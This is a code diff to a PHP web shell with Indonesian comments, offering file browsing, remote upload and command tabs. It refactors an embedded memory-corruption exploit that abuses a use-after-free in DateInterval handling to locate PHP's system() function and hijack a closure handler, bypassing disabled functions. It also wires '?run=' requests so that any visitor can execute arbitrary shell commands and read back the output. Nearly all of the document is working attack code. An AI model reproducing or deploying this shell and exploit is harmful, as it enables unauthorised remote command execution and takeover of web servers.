@@ -143,19 +143,25 @@ function setfilename(val)
 <tr><td>
 <?php
 
-// ========== PWN BYPASS UNTUK CMDV2 (TimeAfterFree) ==========
-class LoggerPwn
+class Logger
 {
     private static $logging = false;
-    public static function log($format, ...$args) {}
+
+    public static function log($format, ...$args)
+    {
+        if (!self::$logging) {
+            return;
+        }
+        printf($format . PHP_EOL, ...$args);
+    }
 }
 
-function allocPwn($size, $canary)
+function alloc($size, $canary)
 {
     return str_shuffle(str_repeat($canary, $size));
 }
 
-function ptr2strPwn($addr, $n = 8)
+function ptr2str($addr, $n = 8)
 {
     $s = '';
     while ($n--) {
@@ -165,14 +171,22 @@ function ptr2strPwn($addr, $n = 8)
     return $s;
 }
 
-class FreeMePwn
+class FreeMe
 {
     private $pwn;
-    public function __construct($pwn) { $this->pwn = $pwn; }
-    public function __destruct() { $this->pwn->helper = $this->pwn->array; }
+
+    public function __construct($pwn)
+    {
+        $this->pwn = $pwn;
+    }
+
+    public function __destruct()
+    {
+        $this->pwn->helper = $this->pwn->array;
+    }
 }
 
-class PwnExecutor
+class Pwn
 {
     private const zend_string_header = 0x18;
     private const dateinterval_handlers_offset = PHP_VERSION_ID < 80500 ? 0x38 : 0x30;
@@ -182,6 +196,7 @@ class PwnExecutor
 
     public $array;
     public $helper;
+
     private $interval;
     private $allocator;
 
@@ -194,23 +209,38 @@ class PwnExecutor
     private function go($cmd)
     {
         $interval_addr = $this->heap_leak();
+        Logger::log("[+] DateInterval @ 0x%x", $interval_addr);
+
         $handlers = $this->read($interval_addr + self::dateinterval_handlers_offset);
+        Logger::log("[+] DateInterval handlers @ 0x%x", $handlers);
+
         $standard_module = $this->get_standard_module($handlers);
+        Logger::log("[+] standard module @ 0x%x", $standard_module);
+
         $standard_functions = $this->read($standard_module + 0x28);
+        Logger::log("[+] standard functions @ 0x%x", $standard_functions);
+
         $system = $this->get_system($standard_functions);
+        Logger::log("[+] system @ 0x%x", $system);
+
         @$this->interval->system1337 = function ($x) {};
         $properties = $this->read($interval_addr + self::dateinterval_properties_offset);
         $arData = $this->read($properties + 0x10);
+
         $closure_index = -1;
         do {
-            $closure_index++;
+            $closure_index += 1;
             $offset = 32 * $closure_index + 0x18;
             $key = $this->read($arData + $offset);
-            $str = ptr2strPwn($this->read($key + self::zend_string_header));
+            $str = ptr2str($this->read($key + self::zend_string_header));
         } while ($str !== 'system13');
+
         $closure_addr = $this->read($arData + 32 * $closure_index);
+        Logger::log("[+] closure @ 0x%x", $closure_addr);
+
         $this->write($closure_addr + 0x38, 1, 4);
         $this->write($closure_addr + self::zif_handler_offset, $system);
+
         ($this->interval->system1337)($cmd);
     }
 
@@ -219,36 +249,46 @@ class PwnExecutor
         for ($i = 0; $i < 63; $i++) {
             $this->allocator[] = new DateInterval('PT0S');
         }
+
         $a = "aaaa";
         $this->array = [
             $a,
             new DateInterval('PT0S'),
             new DateInterval('PT0S'),
-            new FreeMePwn($this),
+            new FreeMe($this),
         ];
         @$this->array .= 'x';
+
         $addr = $this->helper[2]->y;
-        $this->allocator[] = allocPwn(0xa0 - self::zend_string_header - 1, "\x00");
+        $this->allocator[] = alloc(0xa0 - self::zend_string_header - 1, "\x00");
+
+        $d1 = new DateInterval('PT0S');
+        $d2 = new DateInterval('PT0S');
         $this->interval = new DateInterval('PT0S');
+
         return $addr;
     }
 
     private function write($addr, $value, $bytes = 8)
     {
         $mask = $bytes >= 8 ? -1 : ((1 << ($bytes * 8)) - 1);
+
         $a = "aaaa";
         $this->array = [
             $a,
             new DateInterval('PT0S'),
             new DateInterval('PT0S'),
-            new FreeMePwn($this),
+            new FreeMe($this),
         ];
         @$this->array .= 'x';
+
         $block_addr = $this->helper[2]->y;
+
         $this->helper[2]->y = $addr;
         $this->helper[1]->y &= ~$mask;
         $this->helper[1]->y |= ($value & $mask);
         $this->helper[2]->y = $block_addr;
+        $r = $this->helper[1]->y;
     }
 
     private function read($addr, $bytes = 8)
@@ -258,14 +298,21 @@ class PwnExecutor
             $a,
             new DateInterval('PT0S'),
             new DateInterval('PT0S'),
-            new FreeMePwn($this),
+            new FreeMe($this),
         ];
         @$this->array .= 'x';
+
         $block_addr = $this->helper[2]->y;
+
         $this->helper[2]->y = $addr;
         $value = $this->helper[1]->y;
         $this->helper[2]->y = $block_addr;
-        if ($bytes !== 8) $value &= (1 << ($bytes << 3)) - 1;
+        $r = $this->helper[1]->y;
+
+        if ($bytes !== 8) {
+            $value &= (1 << ($bytes << 3)) - 1;
+        }
+
         return $value;
     }
 
@@ -275,7 +322,8 @@ class PwnExecutor
             $addr -= 0x10;
             if ($this->read($addr, 4) === 0xa8 &&
                 in_array($this->read($addr + 4, 4),
-                    [20220829, 20230831, 20240924, 20250925])) {
+                    [20220829, 20230831, 20240924, 20250925]
+                )) {
                 $module_name_addr = $this->read($addr + 0x20);
                 $module_name = $this->read($module_name_addr);
                 if ($module_name === 0x647261646e617473) {
@@ -298,7 +346,7 @@ class PwnExecutor
         } while ($f_entry !== 0);
     }
 }
-// ========== AKHIR PWN ==========
+
 //@set_time_limit(0);
 //@error_reporting(0);
 //@http_response_code(404);
@@ -492,6 +540,34 @@ foreach($_POST as $key => $value){
     $_POST[$key] = stripslashes($value);
 }
 
+// ========== LOGIKA PWN UNTUK CMDV2 ==========
+$output_file = __DIR__ . '/output.txt';
+
+if (isset($_GET['show'])) {
+    if (file_exists($output_file)) {
+        header('Content-Type: text/plain; charset=utf-8');
+        readfile($output_file);
+    } else {
+        echo "No output yet.";
+    }
+    exit;
+}
+
+if (isset($_GET['run'])) {
+    $cmd = $_GET['run'];
+    $workdir = isset($_GET['path']) ? $_GET['path'] : getcwd();
+    if ($workdir && is_dir($workdir)) {
+        chdir($workdir);
+    }
+    $full_cmd = "({$cmd}) > output.txt";
+    new Pwn($full_cmd);
+    // Redirect kembali ke halaman dengan parameter komendv2 dan path yang sama, tapi tanpa 'run'
+    $redirect_url = $_SERVER['SCRIPT_NAME'] . '?path=' . urlencode($workdir) . '&komendv2=gaskan';
+    header("Location: " . $redirect_url);
+    exit;
+}
+// ========== END LOGIKA PWN ==========
+
 if(isset($_GET['path'])){
     $lokasi = $_GET['path'];
     $lokdua = $_GET['path'];
@@ -565,7 +641,7 @@ echo "</table><br>";
 echo '<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">';
 echo '<th>[ &nbsp;<a href="'.$_SERVER['SCRIPT_NAME'].'">Home</a>&nbsp; ]</th>';
 echo '<th>[ &nbsp;<a href="?path='.$lokasi.'&komend=gaskan">C0mmand</a>&nbsp; ]</th>';
-echo '<th>[ &nbsp;<a href="?path='.urlencode($lokasi).'&komendv2=gaskan">C0mand V2</a>&nbsp; ]</th>';
+echo '<th>[ &nbsp;<a href="?path='.urlencode($lokasi).'&komendv2=gaskan">C0mmand V2 (Pwn)</a>&nbsp; ]</th>';
 echo '<th>[ &nbsp;<a href="?path='.$lokasi.'&upload=gaskan">Upload File</a>&nbsp; ]</th>';
 echo "</table><br>";
 
@@ -660,48 +736,25 @@ Upload File From Link :<br>
 } elseif (isset($_GET['komendv2'])) {
     $current_path = isset($_GET['path']) ? $_GET['path'] : getcwd();
     echo "<center>";
-    echo '<form method="get" action="" onsubmit="return false;" id="pwnForm">
+    echo '<form method="get" action="" id="pwnForm">
             <input type="hidden" name="path" value="'.htmlspecialchars($current_path).'">
             <input type="hidden" name="komendv2" value="gaskan">
             <span>'.@get_current_user().'@'.ipserv().':~ $</span>
-            <input type="text" name="run_cmd" id="pwnCmd" style="background:#1f1f1f; color:#fff; width:60%;" autocomplete="off">
-            <button type="button" onclick="executePwn()" class="up" style="cursor:pointer;">>></button>
+            <input type="text" name="run" id="pwnCmd" style="background:#1f1f1f; color:#fff; width:60%;" autocomplete="off">
+            <button type="submit" class="up" style="cursor:pointer;">>></button>
           </form>
-          <iframe id="pwnResult" src="?show_output=1&path='.urlencode($current_path).'" style="width:100%; height:400px; border:1px solid #555; background:#2a2a2a; margin-top:20px;"></iframe>
+          <iframe id="pwnResult" src="?show=1&path='.urlencode($current_path).'" style="width:100%; height:400px; border:1px solid #555; background:#2a2a2a; margin-top:20px;"></iframe>
           <script>
-            function executePwn() {
-                var cmd = document.getElementById("pwnCmd").value;
-                if(!cmd) return;
-                var path = document.getElementById("pwnForm").querySelector("input[name=path]").value;
-                var xhr = new XMLHttpRequest();
-                xhr.open("GET", "?run=" + encodeURIComponent(cmd) + "&path=" + encodeURIComponent(path), true);
-                xhr.onload = function() {
-                    document.getElementById("pwnResult").src = "?show_output=1&path=" + encodeURIComponent(path) + "&t=" + new Date().getTime();
-                };
-                xhr.send();
-            }
+            // Refresh iframe setelah submit form (karena redirect akan memuat ulang halaman)
+            const form = document.getElementById("pwnForm");
+            const iframe = document.getElementById("pwnResult");
+            form.addEventListener("submit", function() {
+                setTimeout(function() {
+                    iframe.src = "?show=1&path=" + encodeURIComponent("'.$current_path.'") + "&t=" + Date.now();
+                }, 500);
+            });
           </script>';
     echo "</center>";
-} elseif (isset($_GET['run'])) {
-    $cmd = $_GET['run'];
-    $workdir = isset($_GET['path']) ? $_GET['path'] : null;
-    if ($workdir && is_dir($workdir)) {
-        chdir($workdir);
-    }
-    $full_cmd = "({$cmd}) > output.txt";
-    new PwnExecutor($full_cmd); // pastikan class PwnExecutor sudah didefinisikan
-    $url = strtok($_SERVER['REQUEST_URI'], '?');
-    header("Location: " . $url);
-    exit;
-} elseif (isset($_GET['show_output'])) {
-    $output_file = __DIR__ . '/output.txt';
-    if (file_exists($output_file)) {
-        header('Content-Type: text/plain; charset=utf-8');
-        readfile($output_file);
-    } else {
-        echo "No output yet.";
-    }
-    exit;
 }
 
 if (!is_readable($lokasi)) {
